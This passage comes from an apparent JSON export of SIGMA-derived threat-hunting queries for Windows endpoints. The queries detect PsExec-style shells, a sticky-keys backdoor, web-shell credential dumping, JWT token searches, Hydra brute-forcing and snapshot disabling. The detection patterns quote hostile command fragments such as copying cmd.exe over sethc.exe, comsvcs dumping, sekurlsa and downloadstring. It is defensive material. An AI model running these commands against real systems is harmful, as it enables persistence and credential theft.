tgt.process.cmdline contains \" \u2014s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2015s -i pwsh\" or tgt.process.cmdline contains \" \u2015s /i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2015i pwsh\" or tgt.process.cmdline contains \" -i -s pwsh\" or tgt.process.cmdline contains \" -i /s pwsh\" or tgt.process.cmdline contains \" -i \u2013s pwsh\" or tgt.process.cmdline contains \" -i \u2014s pwsh\" or tgt.process.cmdline contains \" -i \u2015s pwsh\" or tgt.process.cmdline contains \" /i -s pwsh\" or tgt.process.cmdline contains \" /i /s pwsh\" or tgt.process.cmdline contains \" /i \u2013s pwsh\" or tgt.process.cmdline contains \" /i \u2014s pwsh\" or tgt.process.cmdline contains \" /i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2013i -s pwsh\" or tgt.process.cmdline contains \" \u2013i /s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2014i -s pwsh\" or tgt.process.cmdline contains \" \u2014i /s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2015i -s pwsh\" or tgt.process.cmdline contains \" \u2015i /s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2015s pwsh\" or tgt.process.cmdline contains \" -s powershell\" or tgt.process.cmdline contains \" /s powershell\" or tgt.process.cmdline contains \" \u2013s powershell\" or tgt.process.cmdline contains \" \u2014s powershell\" or tgt.process.cmdline contains \" \u2015s powershell\" or tgt.process.cmdline contains \" -s -i powershell\" or tgt.process.cmdline contains \" -s /i powershell\" or tgt.process.cmdline contains \" -s \u2013i powershell\" or tgt.process.cmdline contains \" -s \u2014i powershell\" or tgt.process.cmdline contains \" -s \u2015i powershell\" or tgt.process.cmdline contains \" /s -i powershell\" or tgt.process.cmdline contains \" /s /i powershell\" or tgt.process.cmdline contains \" /s \u2013i powershell\" or tgt.process.cmdline contains \" /s \u2014i powershell\" or tgt.process.cmdline contains \" /s \u2015i powershell\" or tgt.process.cmdline contains \" \u2013s -i powershell\" or tgt.process.cmdline contains \" \u2013s /i powershell\" or tgt.process.cmdline contains \" \u2013s \u2013i powershell\" or tgt.process.cmdline contains \" \u2013s \u2014i powershell\" or tgt.process.cmdline contains \" \u2013s \u2015i powershell\" or tgt.process.cmdline contains \" \u2014s -i powershell\" or tgt.process.cmdline contains \" \u2014s /i powershell\" or tgt.process.cmdline contains \" \u2014s \u2013i powershell\" or tgt.process.cmdline contains \" \u2014s \u2014i powershell\" or tgt.process.cmdline contains \" \u2014s \u2015i powershell\" or tgt.process.cmdline contains \" \u2015s -i powershell\" or tgt.process.cmdline contains \" \u2015s /i powershell\" or tgt.process.cmdline contains \" \u2015s \u2013i powershell\" or tgt.process.cmdline contains \" \u2015s \u2014i powershell\" or tgt.process.cmdline contains \" \u2015s \u2015i powershell\" or tgt.process.cmdline contains \" -i -s powershell\" or tgt.process.cmdline contains \" -i /s powershell\" or tgt.process.cmdline contains \" -i \u2013s powershell\" or tgt.process.cmdline contains \" -i \u2014s powershell\" or tgt.process.cmdline contains \" -i \u2015s powershell\" or tgt.process.cmdline contains \" /i -s powershell\" or tgt.process.cmdline contains \" /i /s powershell\" or tgt.process.cmdline contains \" /i \u2013s powershell\" or tgt.process.cmdline contains \" /i \u2014s powershell\" or tgt.process.cmdline contains \" /i \u2015s powershell\" or tgt.process.cmdline contains \" \u2013i -s powershell\" or tgt.process.cmdline contains \" \u2013i /s powershell\" or tgt.process.cmdline contains \" \u2013i \u2013s powershell\" or tgt.process.cmdline contains \" \u2013i \u2014s powershell\" or tgt.process.cmdline contains \" \u2013i \u2015s powershell\" or tgt.process.cmdline contains \" \u2014i -s powershell\" or tgt.process.cmdline contains \" \u2014i /s powershell\" or tgt.process.cmdline contains \" \u2014i \u2013s powershell\" or tgt.process.cmdline contains \" \u2014i \u2014s powershell\" or tgt.process.cmdline contains \" \u2014i \u2015s powershell\" or tgt.process.cmdline contains \" \u2015i -s powershell\" or tgt.process.cmdline contains \" \u2015i /s powershell\" or tgt.process.cmdline contains \" \u2015i \u2013s powershell\" or tgt.process.cmdline contains \" \u2015i \u2014s powershell\" or tgt.process.cmdline contains \" \u2015i \u2015s powershell\") and (not (tgt.process.cmdline contains \"paexec\" or tgt.process.cmdline contains \"PsExec\" or tgt.process.cmdline contains \"accepteula\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1105
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system.\nWhen the sticky keys are \"activated\" the privilleged shell is launched.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Persistence Via Sticky Key Backdoor",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \"/y \" and tgt.process.cmdline contains \"C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1106
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1018",
                "t1033",
                "t1087"
            ],
            "name": "Webshell Hacking Activity Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_tomcatservice.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (tgt.process.cmdline contains \"catalina.jar\" or tgt.process.cmdline contains \"CATALINA_HOME\"))) and ((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"comsvcs\") or (tgt.process.cmdline contains \" -hp\" and tgt.process.cmdline contains \" a \" and tgt.process.cmdline contains \" -m\") or (tgt.process.cmdline contains \"net\" and tgt.process.cmdline contains \" user \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"net\" and tgt.process.cmdline contains \" localgroup \" and tgt.process.cmdline contains \" administrators \" and tgt.process.cmdline contains \"/add\") or (tgt.process.image.path contains \"\\ntdsutil.exe\" or tgt.process.image.path contains \"\\ldifde.exe\" or tgt.process.image.path contains \"\\adfind.exe\" or tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\Nanodump.exe\" or tgt.process.image.path contains \"\\vssadmin.exe\" or tgt.process.image.path contains \"\\fsutil.exe\") or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -NoP \" or tgt.process.cmdline contains \" -W Hidden \" or tgt.process.cmdline contains \" /decode \" or tgt.process.cmdline contains \" /ticket:\" or tgt.process.cmdline contains \" sekurlsa\" or tgt.process.cmdline contains \".dmp full\" or tgt.process.cmdline contains \".downloadfile(\" or tgt.process.cmdline contains \".downloadstring(\" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"process call create\" or tgt.process.cmdline contains \"reg save \" or tgt.process.cmdline contains \"whoami /priv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1107
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\nUsee to Query/modify DNS records for Active Directory integrated DNS via LDAP\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1018"
            ],
            "name": "PUA - Adidnsdump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\python.exe\" and tgt.process.cmdline contains \"adidnsdump\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1108
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Regedit as Trusted Installer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\regedit.exe\" and (src.process.image.path contains \"\\TrustedInstaller.exe\" or src.process.image.path contains \"\\ProcessHacker.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1109
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"aspnet_compiler.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Suspicious Child Process of AspNetCompiler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\aspnet_compiler.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\notepad.exe\") or (tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Roaming\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \":\\Windows\\Tasks\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1110
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Cmd.EXE Missing Space Characters Execution Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"cmd.exe/c\" or tgt.process.cmdline contains \"\\cmd/c\" or tgt.process.cmdline contains \"\\\"cmd/c\" or tgt.process.cmdline contains \"cmd.exe/k\" or tgt.process.cmdline contains \"\\cmd/k\" or tgt.process.cmdline contains \"\\\"cmd/k\" or tgt.process.cmdline contains \"cmd.exe/r\" or tgt.process.cmdline contains \"\\cmd/r\" or tgt.process.cmdline contains \"\\\"cmd/r\") or (tgt.process.cmdline contains \"/cwhoami\" or tgt.process.cmdline contains \"/cpowershell\" or tgt.process.cmdline contains \"/cschtasks\" or tgt.process.cmdline contains \"/cbitsadmin\" or tgt.process.cmdline contains \"/ccertutil\" or tgt.process.cmdline contains \"/kwhoami\" or tgt.process.cmdline contains \"/kpowershell\" or tgt.process.cmdline contains \"/kschtasks\" or tgt.process.cmdline contains \"/kbitsadmin\" or tgt.process.cmdline contains \"/kcertutil\") or (tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"cmd /r\")) and (not ((tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd /r \") or (tgt.process.cmdline contains \"AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules\" or tgt.process.cmdline contains \"cmd.exe/c .\" or tgt.process.cmdline=\"cmd.exe /c\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1111
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects modification addition to the 'TypedPaths' key in the user or admin registry via the commandline. Which might indicate persistence attempt",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Persistence Via TypedPaths - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1112
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by Hydra password guessing hack tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1110",
                "t1110"
            ],
            "name": "HackTool - Hydra Password Bruteforce Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"-u \" and tgt.process.cmdline contains \"-p \") and (tgt.process.cmdline contains \"^USER^\" or tgt.process.cmdline contains \"^PASS^\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1113
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious script executions from temporary folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Script Execution From Temp Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\") and (tgt.process.cmdline contains \"\\Windows\\Temp\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\Temp\" or tgt.process.cmdline contains \"%TEMP%\" or tgt.process.cmdline contains \"%TMP%\" or tgt.process.cmdline contains \"%LocalAppData%\\Temp\")) and (not (tgt.process.cmdline contains \" >\" or tgt.process.cmdline contains \"Out-File\" or tgt.process.cmdline contains \"ConvertTo-Json\" or tgt.process.cmdline contains \"-WindowStyle hidden -Verb runAs\" or tgt.process.cmdline contains \"\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1114
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commands that temporarily turn off Volume Snapshots",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Disabled Volume Snapshots",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Services\\VSS\\Diag\" and tgt.process.cmdline contains \"/d Disabled\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1115
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\nThis string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1528"
            ],
            "name": "Potentially Suspicious JWT Token Search Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"eyJ0eXAiOi\" or tgt.process.cmdline contains \"eyJhbGciOi\" or tgt.process.cmdline contains \" eyJ0eX\" or tgt.process.cmdline contains \" \\\"eyJ0eX\\\"\" or tgt.process.cmdline contains \" 'eyJ0eX'\" or tgt.process.cmdline contains \" eyJhbG\" or tgt.process.cmdline contains \" \\\"eyJhbG\\\"\" or tgt.process.cmdline contains \" 'eyJhbG'\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1116
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "MMC20 Lateral Movement",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and tgt.process.image.path contains \"\\mmc.exe\" and tgt.process.cmdline contains \"-Embedding\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1117
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Launch-VsDevShell.PS1 Proxy Execution",
